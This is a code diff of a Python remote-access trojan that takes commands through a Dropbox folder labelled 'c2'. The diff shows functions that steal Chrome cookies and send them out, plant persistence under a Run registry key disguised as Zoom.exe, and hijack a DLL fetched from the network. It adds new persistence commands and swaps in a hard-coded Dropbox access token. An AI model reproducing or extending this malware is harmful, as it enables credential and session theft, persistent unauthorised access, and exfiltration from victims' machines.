@@ -56,7 +56,7 @@ def get_chrome_cookies(db=None, output_file="chrome_cookies.txt"):
     # If no database provided, use default path
     if db is None:
         from os.path import expandvars
-        db = expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')
+        db = expandvars('C:/Users/john/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies')
 
     # Read the encrypted key from Local State file
     try:
@@ -148,16 +148,16 @@ def persist_dll():
                 file.write(response.content)
             print("DLL downloaded successfully.")
             write_output(b"Persistance Achieved")
-    except:
-        print(f"Failed to download file. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"e")
         write_output(b'DLL Hijacking Failed, try again!!')
 
 
 
-def persistance():
+def persist_reg():
     try:
         key_name = "Zoom.exe"  
-        executable_path = r"C:\Users\susheel\Desktop\VsCode\DLLHij\dist\hello.exe"   # replace the path with drop location
+        executable_path = r"C:\Windows\Temp\zoom.exe"   # replace the path with drop location
 
         # Open the registry key
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
@@ -173,6 +173,9 @@ def persistance():
     except Exception as e:
         write_output(b'Failed adding registery key')
         print("An error occurred:", e)
+
+def clean_up():
+    pass
     
 
 
@@ -209,13 +212,17 @@ def check_new_command(prev_output):
             time.sleep(n)
         
         elif new_command == 'exit':
+            clean_up()
             exit(0)
 
         elif new_command == 'get_cookies':
             exfil()
 
-        elif new_command == 'persistance':
-            persistance()
+        elif new_command == 'persist_reg':
+            persist_reg()
+
+        elif new_command == 'persist_dll':
+            persist_dll()
         
         elif new_command.split(" ")[0] == 'cd':
             try:
@@ -238,7 +245,7 @@ if __name__ == '__main__':
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
     # Dropbox token
-    token = "sl.BzuQXugw07LSvyTMx14EaGiRJgk-YkrNRoKEL8U-YiLXWF_OkVDuiZPj5nARyFwHTtkoI4Q-gx3gUFH79Mb2ExVFmS9hd6QQqNdArX6SvNhXQiwX0ya5ScnFD7e16SqwqehBgDzbJb_DJoVvI1E4"
+    token = "sl.Bz--6Bn-VLUuToNivoPDz9Q8LTT-AWRSBRmYUAMh8fQEDGJp2DmTOf-ILf7CwDg0iWsTFk_3o4H3VD4hQzEngpolAEVjdDBopAwqv0xgi1ssfwS1htYK_HRaViJLF1i9J2UVgY308EyooO5NnyGw"
 
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
